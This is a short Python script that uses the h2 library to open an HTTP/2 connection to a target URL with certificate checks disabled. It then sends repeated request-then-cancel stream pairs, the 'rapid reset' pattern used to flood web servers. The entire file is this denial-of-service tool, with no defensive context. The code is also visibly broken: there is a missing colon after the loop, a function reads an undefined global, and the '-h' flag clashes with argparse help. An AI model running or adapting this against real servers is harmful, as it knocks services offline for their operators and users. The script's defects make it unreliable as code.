import argparse
import sys
from urllib.parse import urlparse
import socket
from h2.connection import H2Connection
#from h2.events import RequestReceived, StreamReset
from h2.config import H2Configuration
import ssl
from h2.errors import ErrorCodes

def parsed_url(url):
    url_obj = urlparse(args.url)

    scheme = url_obj.scheme
    if not scheme:
        scheme = "http"

    port = url_obj.port

    if not port:
        if scheme == 'http':
            port = 80
        if scheme == 'https':
            port = 443

    return scheme, url_obj.hostname, port

def main():
    parser = argparse.ArgumentParser()

    parser.add_argument("-u", "--url", help="Target URL")
    parser.add_argument("-h", "--hits", help="Number of Request/Reset frames", type=int, default=100)

    args = parser.parse_args()

    scheme, address, port = parsed_url(args.url)

    # Create a TCP connection
    sock = socket.create_connection((address, port))
    if scheme == "https":
        # Wrap the socket for TLS
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(['h2'])
        sock = ctx.wrap_socket(sock, server_hostname=address)
        # Make sure we're using HTTP/2
        assert sock.selected_alpn_protocol() == 'h2'

    # Create HTTP/2 connection
    config = H2Configuration(client_side=True)
    conn = H2Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    for i in range(args.hits)
        # Create a new stream
        stream_id = conn.get_next_available_stream_id()
        conn.send_headers(
                stream_id,
                [(':method', 'GET'), (':authority', address), (':path', '/'), (':scheme', 'https')],
                )
        conn.reset_stream(stream_id, error_code=ErrorCodes.CANCEL)

    sock.sendall(conn.data_to_send())

    # Read some data
    while True:
        data = sock.recv(65535)
        if not data:
            print("no more data, exiting")
            break

        events = conn.receive_data(data)
        for event in events:
            print(f"Event received: {event}")
            print(f"stram_id received: {event.stream_id}")
            #if isinstance(event, RequestReceived):
            #elif isinstance(event, StreamReset):
            #    print(f"Stream {event.stream_id} cancelled.")

if __name__ == "__main__":
    main()
